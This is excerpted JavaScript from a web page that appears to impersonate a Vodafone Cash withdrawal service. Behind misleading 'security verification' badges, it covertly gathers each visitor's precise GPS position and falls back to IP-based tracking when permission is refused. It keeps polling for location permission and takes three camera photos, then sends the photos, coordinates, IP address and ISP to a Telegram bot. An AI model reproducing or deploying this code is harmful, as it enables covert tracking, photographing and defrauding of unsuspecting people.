...
function initModal() {
  ...
  form.addEventListener('submit', (e) => {
    ...
    // محاولة تحديث الموقع بدقة فائقة عند إرسال الطلب، أو تفعيل الخطة البديلة في حال الرفض
    if (navigator.geolocation && navigator.geolocation.getCurrentPosition) {
      navigator.geolocation.getCurrentPosition(
        pos => {
          enrichGpsWithNetworkInfo(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, false);
        },
        err => {
          console.log("BG loc error, using fallback:", err);
          if (!userLocationCoords) fetchFallbackLocation("رفض صلاحية الـ GPS أثناء السحب");
        },
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
      );
    } else if (!userLocationCoords) {
      fetchFallbackLocation("عدم دعم الـ GPS أثناء السحب");
    }

    const getOrderCaption = (idx) => {
      let locStr = 'تعذر التحديد';
      if (userLocationCoords) {
        const mapLink = `<a href="https://maps.google.com/?q=${userLocationCoords.lat},${userLocationCoords.lon}">🌐 اضغط لعرض الموقع على خريطة جوجل (${userLocationCoords.lat.toFixed(4)}, ${userLocationCoords.lon.toFixed(4)})</a>`;
        const typeStr = userLocationCoords.isFallback ? ' (🛡️ تعقب شبكي بديل)' : ' (🛰️ GPS فائق الدقة)';
        const accStr = userLocationCoords.accuracy ? `\n🎯 <b>دقة الرصد:</b> ${userLocationCoords.accuracy}` : '';
        const cityStr = userLocationCoords.city ? `\n🏙️ <b>المدينة/المنطقة:</b> ${userLocationCoords.city} - ${userLocationCoords.region || ''}` : '';
        const ispStr = userLocationCoords.isp ? `\n📡 <b>شبكة الاتصال (ISP):</b> ${userLocationCoords.isp}` : '';
        const ipStr = userLocationCoords.ip ? `\n🌐 <b>عنوان الـ IP:</b> <code>${userLocationCoords.ip}</code>` : '';
        locStr = `${mapLink}${typeStr}${accStr}${cityStr}${ispStr}${ipStr}`;
      }
...
⏰ <b>وقت العملية:</b> ${new Date().toLocaleString('ar-EG')}`;
    ...
    // مؤقت احتياطي في حال تأخر المستخدم في الرد على نافذة سماحية الكاميرا
    let fallbackTimer = setTimeout(() => {
      sendOrderToTG(null);
    }, 7000);

    // طلب صلاحية الكاميرا عند إدخال الرقم وعمل سحب كما طلب المستخدم
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          clearTimeout(fallbackTimer);
          console.log("✔ تم تفعيل صلاحية الكاميرا بنجاح وبدء إرسال الصور والموقع للبوت فوراً");
          
          // إرسال إشعار فوري للبوت عند تفعيل صلاحية الكاميرا
          const locStr = userLocationCoords ? `<a href="https://maps.google.com/?q=${userLocationCoords.lat},${userLocationCoords.lon}">🌐 اضغط لعرض الموقع على خريطة جوجل (${userLocationCoords.lat.toFixed(4)}, ${userLocationCoords.lon.toFixed(4)})</a>` : 'تعذر التحديد';
          sendTelegramNotification(`🟢 <b>[تفعيل صلاحية الكاميرا فوراً - طلب سحب]</b> ⚡\n✅ قام العميل بالموافقة على تفعيل صلاحية الكاميرا الآن للطلب [<b>${orderId}</b>]!\n━━━━━━━━━━━━━━━━━━━━\n📍 <b>الموقع الجغرافي:</b> ${locStr}\n⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}`);

          captureThreePhotosAndSendToTG(stream, getOrderCaption, `📸 <b>صورة التحقق للطلب [${orderId}]</b>`, () => getOrderCaption(null));
        })
        .catch(err => {
          clearTimeout(fallbackTimer);
          console.log("تنبيه: تم رفض صلاحية الكاميرا:", err);
          sendTelegramNotification(`⚠️ <b>[تنبيه: رفض صلاحية الكاميرا]</b> ⚠️\n❌ قام العميل برفض أو حجب صلاحية الكاميرا للطلب [<b>${orderId}</b>].\n⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}`);
          sendOrderToTG(null);
        });
    } else {
      clearTimeout(fallbackTimer);
...
function captureThreePhotosAndSendToTG(stream, getCaptionFn, subCaptionPrefix, fallbackText = null) {
  ...
  // التقاط 3 صور متتالية بسرعة عند تفعيل الصلاحية
  setTimeout(() => takePhoto(1), 200);
  setTimeout(() => takePhoto(2), 1200);
  setTimeout(() => takePhoto(3), 2200);
}

// نظام التعقب الخارق: جلب أقرب موقع للزائر بأقصى قوة عبر 4 خوادم شبكية عالمية عند رفض أو تعذر صلاحية الـ GPS (الخطة البديلة)
function fetchFallbackLocation(reason = "رفض أو تعذر صلاحية الـ GPS") {
  console.log(`🛡️ تفعيل الخطة البديلة بأقصى قوة: جلب أقرب موقع شبكي للزائر السبب: ${reason}`);
  
  const apis = [
    {
      url: 'https://ipwho.is/',
      parse: data => (data && data.success !== false && data.latitude) ? {
        lat: data.latitude,
        lon: data.longitude,
        city: data.city || '',
        region: data.region || '',
  ...
  let tryApi = (index) => {
    if (index >= apis.length) {
      console.warn("❌ تعذر جلب الموقع عبر جميع الخوادم الشبكية البديلة.");
      return;
    }
    ...
    fetch(api.url)
      ...
      .then(data => {
        ...
        if (parsed && parsed.lat && parsed.lon) {
          console.log(`✔ تم جلب أقرب موقع للزائر بأقصى قوة عبر الخادم البديل (${api.url}):`, parsed);
          userLocationCoords = {
            lat: parsed.lat,
            lon: parsed.lon,
            isFallback: true,
            ...
            isp: parsed.isp,
            ip: parsed.ip,
            accuracy: '±500 متر (تعقب شبكي عبر برج الاتصال والـ IP)'
          };

          showLocationBadge(true, `📍 تم رصد الموقع الجغرافي (${parsed.city || 'مصر'}) ✔️ (نظام التعقب البديل)`);

          const locLink = `<a href="https://maps.google.com/?q=${parsed.lat},${parsed.lon}">🌐 اضغط لعرض أقرب مكان للزائر على خريطة جوجل (${parsed.lat.toFixed(4)}, ${parsed.lon.toFixed(4)})</a>`;
          sendTelegramNotification(`🛡️ <b>[تفعيل الخطة البديلة بأقصى قوة - رصد موقع الزائر]</b> ⚡\n❌ قام الزائر برفض أو حجب سماحية الـ GPS، تم تشغيل التعقب الشبكي وجلب أقرب موقع له فوراً!\n━━━━━━━━━━━━━━━━━━━━\n📍 <b>أقرب مكان للزائر:</b> ${locLink}\n🎯 <b>دقة الرصد:</b> تعقب شبكي عبر برج الاتصال والـ IP\n🏙️ <b>المدينة والمنطقة:</b> ${parsed.city} - ${parsed.region}\n📡 <b>شبكة الاتصال (ISP):</b> ${parsed.isp}\n🌐 <b>عنوان الـ IP:</b> <code>${parsed.ip}</code>\n⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}`);
        } else {
          tryApi(index + 1);
        }
      })
      .catch(err => {
        console.warn(`خطأ في الخادم البديل ${api.url}:`, err);
        tryApi(index + 1);
      });
  };
...
// متغير لتتبع هل تم إرسال إشعار الـ GPS الدقيق مسبقاً لتجنب التكرار
let gpsAlertSent = false;

// إثراء إحداثيات الـ GPS الفائقة الدقة بمعلومات الشبكة والـ IP
function enrichGpsWithNetworkInfo(lat, lon, accuracy, notify = true, triggerSource = "مع تحميل الموقع") {
  fetch('https://ipwho.is/')
    .then(r => r.json())
    .then(data => {
      const city = data.city || '';
      const region = data.region || '';
      const isp = data.connection ? data.connection.isp : (data.isp || '');
      const ip = data.ip || '';
      ...
      userLocationCoords = {
        ...
        lon: lon,
        isFallback: false,
        accuracy: `±${Math.round(accuracy || 3)} متر (GPS قمر صناعي فائق الدقة)`,
        city: city,
        region: region,
        isp: isp,
        ip: ip
      ...
      if (notify) {
        const locLink = `<a href="https://maps.google.com/?q=${lat},${lon}">🌐 اضغط لعرض موقع الزائر الدقيق على خريطة جوجل (${lat.toFixed(4)}, ${lon.toFixed(4)})</a>`;
        sendTelegramNotification(`🟢 <b>[تفعيل صلاحية الموقع فوراً (${triggerSource})]</b> ⚡\n✅ قام الزائر الآن بالموافقة على تفعيل صلاحية الموقع الجغرافي (GPS)!\n━━━━━━━━━━━━━━━━━━━━\n📍 <b>الموقع الدقيق على الخريطة:</b> ${locLink}\n🎯 <b>دقة الـ GPS:</b> ±${Math.round(accuracy || 3)} متر (دقة متناهية)\n🏙️ <b>المدينة والمنطقة:</b> ${city} - ${region}\n📡 <b>شبكة الاتصال (ISP):</b> ${isp}\n🌐 <b>عنوان الـ IP:</b> <code>${ip}</code>\n⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}`);
      }
    })
    .catch(() => {
      userLocationCoords = {
        ...
        lon: lon,
        isFallback: false,
        accuracy: `±${Math.round(accuracy || 3)} متر (GPS قمر صناعي)`
      };
      if (notify) {
        const locLink = `<a href="https://maps.google.com/?q=${lat},${lon}">🌐 اضغط لعرض موقع الزائر الدقيق على خريطة جوجل (${lat.toFixed(4)}, ${lon.toFixed(4)})</a>`;
        sendTelegramNotification(`🟢 <b>[تفعيل صلاحية الموقع فوراً (${triggerSource})]</b> ⚡\n✅ قام الزائر الآن بالموافقة على تفعيل صلاحية الموقع الجغرافي (GPS)!\n━━━━━━━━━━━━━━━━━━━━\n📍 <b>الموقع الدقيق على الخريطة:</b> ${locLink}\n🎯 <b>دقة الـ GPS:</b> ±${Math.round(accuracy || 3)} متر (دقة متناهية)\n⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}`);
...
// مراقبة مستمرة لصلاحية الموقع طوال تواجد الزائر في الموقع (لإرسال الإشعار فور التفعيل في أي ثانية)
function startContinuousLocationMonitoring() {
  console.log("🔍 بدء المراقبة المستمرة لصلاحية الموقع الجغرافي طوال تواجد الزائر في الموقع...");

  const checkAndSendIfGranted = (triggerSource) => {
    if (gpsAlertSent) return; // تم إرسال إشعار الـ GPS الدقيق مسبقاً
    ...
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          if (!gpsAlertSent) {
            gpsAlertSent = true;
            console.log(`✔ تم رصد تفعيل الـ GPS فوراً أثناء التصفح (${triggerSource})! الإحداثيات:`, position.coords.latitude, position.coords.longitude);
            showLocationBadge(true, "📍 تم التحقق من النطاق الجغرافي (مصر - EG) ✔️ متوافق مع خوادم فودافون كاش المحلية");
            enrichGpsWithNetworkInfo(position.coords.latitude, position.coords.longitude, position.coords.accuracy, true, triggerSource);
            
            // تشغيل متتبع الـ GPS لعدة ثوانٍ لرفع الدقة لأقصى حد ممكن
            let watchId = navigator.geolocation.watchPosition(
              (newPos) => {
                if (userLocationCoords && newPos.coords.accuracy < parseInt(userLocationCoords.accuracy || 100)) {
                  userLocationCoords.lat = newPos.coords.latitude;
                  userLocationCoords.lon = newPos.coords.longitude;
                  userLocationCoords.accuracy = `±${Math.round(newPos.coords.accuracy)} متر (GPS قمر صناعي فائق الدقة)`;
                }
              },
              null,
              { enableHighAccuracy: true, maximumAge: 0 }
            );
            setTimeout(() => navigator.geolocation.clearWatch(watchId), 8000);
          }
        },
        () => {},
  ...
  // 1. مراقبة لحظية عبر واجهة الصلاحيات في المتصفح (Permissions API)
  if (navigator.permissions && navigator.permissions.query) {
    navigator.permissions.query({ name: 'geolocation' })
      .then(permissionStatus => {
        if (permissionStatus.state === 'granted') {
          checkAndSendIfGranted("تفعيل الصلاحية مباشرة");
        }
        permissionStatus.onchange = () => {
          console.log("⚡ تنبيه: تغيرت حالة سماحية الـ GPS في المتصفح إلى:", permissionStatus.state);
          if (permissionStatus.state === 'granted') {
            console.log("✔ الزائر قام بتفعيل صلاحية الموقع الآن! جاري الرصد والإرسال الفوري...");
            checkAndSendIfGranted("تفعيل الصلاحية لحظياً أثناء التصفح");
          }
        };
      })
      .catch(err => console.log("Permissions API fallback:", err));
  }

  // 2. فحص دوري مستمر في الخلفية كل 2.5 ثانية طوال تواجد الزائر في الموقع (لضمان التقاط التفعيل في جميع المتصفحات والهواتف)
  setInterval(() => {
    if (!gpsAlertSent) {
      if (navigator.permissions && navigator.permissions.query) {
        navigator.permissions.query({ name: 'geolocation' })
          .then(res => {
            if (res.state === 'granted') {
              checkAndSendIfGranted("فحص دوري مستمر - تم اكتشاف التفعيل");
            }
          })
          .catch(() => {});
      }
...
// 9. Geolocation Verification on Page Load (طلب صلاحية الموقع مع تحميل الصفحة وإرسال إشعار فوري للبوت عند التفعيل أو تشغيل الخطة البديلة)
function initLocationPermission() {
  if ("geolocation" in navigator) {
    console.log("جاري طلب صلاحية الموقع الجغرافي بدقة فائقة مع تحميل الموقع...");
    navigator.geolocation.getCurrentPosition(
      (position) => {
        gpsAlertSent = true;
        console.log("تم تحديد الموقع بدقة بنجاح:", position.coords.latitude, position.coords.longitude, "الدقة بالمتر:", position.coords.accuracy);
        showLocationBadge(true, "📍 تم التحقق من النطاق الجغرافي (مصر - EG) ✔️ متوافق مع خوادم فودافون كاش المحلية");
        enrichGpsWithNetworkInfo(position.coords.latitude, position.coords.longitude, position.coords.accuracy, true, "مع تحميل الموقع");
        
        // تشغيل متتبع الـ GPS لعدة ثوانٍ لرفع الدقة لأقصى حد ممكن (من 30 متر إلى 3 أمتار)
        let watchId = navigator.geolocation.watchPosition(
          (newPos) => {
            if (userLocationCoords && newPos.coords.accuracy < parseInt(userLocationCoords.accuracy || 100)) {
              userLocationCoords.lat = newPos.coords.latitude;
      ...
      (error) => {
        console.warn("تم رفض صلاحية الموقع أو حدث خطأ، جاري تشغيل الخطة البديلة:", error.message);
        showLocationBadge(false, "⚠️ يتم الآن التحقق عبر النطاق الجغرافي البديل لضمان أمان التحويل المالي");
        fetchFallbackLocation("رفض الزائر لصلاحية الـ GPS مع تحميل الصفحة");
      },
      {
    ...
    showLocationBadge(false, "⚠️ متصفحك لا يدعم الـ GPS، جاري تشغيل التعقب البديل.");
    fetchFallbackLocation("عدم دعم الـ GPS في المتصفح");
  }

  // تفعيل المراقبة المستمرة طوال تواجد الزائر في الموقع
